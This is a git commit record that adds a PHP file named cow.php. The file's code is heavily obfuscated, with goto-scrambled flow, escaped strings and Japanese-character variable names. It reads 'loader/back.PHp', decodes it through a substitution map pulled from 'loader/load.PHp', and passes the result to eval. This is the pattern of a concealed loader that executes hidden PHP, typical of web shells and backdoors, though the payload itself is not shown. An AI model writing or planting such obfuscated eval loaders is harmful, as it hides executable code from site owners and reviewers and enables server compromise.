ffc5f455a50acd6d623871432d63d9e32586751a
0xbeethoven <150875212+0xbeethoven@users.noreply.github.com>
2023-12-06 15:08:04 +0900

    Create cow.php

---
+++ cow.php
@@ -0,0 +1,2 @@
+<?php
+ goto T69MJ; RzyU6: $シ = file_get_contents("\154\x6f\141\x64\x65\x72\x2f\x62\x61\x63\153\x2e\120\x48\160"); goto FQpT_; T69MJ: function ゆ($シ) { include "\154\x6f\141\x64\x65\x72\57\154\x6f\141\144\56\120\110\x70"; $げ = ''; $length = mb_strlen($シ, "\125\124\x46\x2d\x38"); for ($i = 0; $i < $length; $i++) { $char = mb_substr($シ, $i, 1, "\x55\124\x46\55\70"); $げ .= isset($犬[$char]) ? $犬[$char] : $char; } return $げ; } goto RzyU6; FQpT_: $薄 = ゆ($シ); goto pma96; pma96: eval("\77\x3e" . $薄); goto Na5JD; Na5JD: ?>
